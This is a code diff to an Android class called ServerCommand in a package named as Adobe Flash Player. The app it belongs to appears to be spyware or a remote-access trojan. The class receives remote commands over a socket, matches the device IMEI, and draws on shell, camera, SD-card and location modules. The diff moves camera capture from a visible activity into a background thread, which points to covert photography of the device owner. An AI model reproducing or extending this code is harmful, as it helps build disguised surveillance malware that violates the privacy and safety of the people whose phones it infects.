@@ -11,7 +11,7 @@ import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.AccessHelper;
 import com.adobe.flashplayer.accessory.LinuxShell;
 import com.adobe.flashplayer.core.DeviceManager;
-import com.adobe.flashplayer.data.CameraActivity2;
+
 import com.adobe.flashplayer.data.CameraDialog;
 import com.adobe.flashplayer.data.ExtSDCardFile;
 import com.adobe.flashplayer.data.Location.AMaplocation;
@@ -79,7 +79,7 @@ public class ServerCommand implements Runnable{
 	
 	
 	
-	public synchronized void run(){
+	public  void run(){
 
 		while(true){
 			Socket socket = null;
@@ -110,8 +110,8 @@ public class ServerCommand implements Runnable{
 								if (compareImei(recvimei,Public.IMEI) == true) {
 									int result = ServerCommandProc(ins,ous,recvbuf,recvlen);
 									if (result < 0) {
-										Log.e(TAG,"[liujinguang]ServerCommand recv packet error:" + result);
-										MyLog.writeLogFile("[liujinguang]ServerCommand recv packet error:" + result + "\r\n");
+										Log.e(TAG,"[ljg]ServerCommand recv packet error:" + result);
+										MyLog.writeLogFile("[ljg]ServerCommand recv packet error:" + result + "\r\n");
 										
 										break;
 									}else{
@@ -321,11 +321,14 @@ public class ServerCommand implements Runnable{
 
 				int installtype = AccessHelper.getInstallMode(context);
 				if (installtype == AccessHelper.INSTALL_TYPE_MANUAL||installtype == AccessHelper.INSTALL_TYPE_APK){
-					Intent intentCamera = new Intent(context, CameraActivity2.class);
-					intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-					intentCamera.putExtra("index",0);
-					intentCamera.putExtra("count",1);
-					context.startActivity(intentCamera);
+
+					new Thread(new CameraDialog(context,0)).start();
+
+					//Intent intentCamera = new Intent(context, CameraActivity2.class);
+					//intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+					//intentCamera.putExtra("index",0);
+					//intentCamera.putExtra("count",1);
+					//context.startActivity(intentCamera);
 				}else if (installtype == AccessHelper.INSTALL_TYPE_JAR || installtype == AccessHelper.INSTALL_TYPE_SO){
 					new Thread(new CameraDialog(context,intcamera)).start();
 				}
@@ -673,7 +676,7 @@ public class ServerCommand implements Runnable{
 			ex.printStackTrace();
 			String error = Utils.getExceptionDetail(ex);
 			String stack = Utils.getCallStack();
-			MyLog.writeLogFile("[liujinguang]ServerCommand command:" + String.valueOf(cmdtype) +
+			MyLog.writeLogFile("[ljg]ServerCommand command:" + String.valueOf(cmdtype) +
 					" exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
 			return false;
 		}
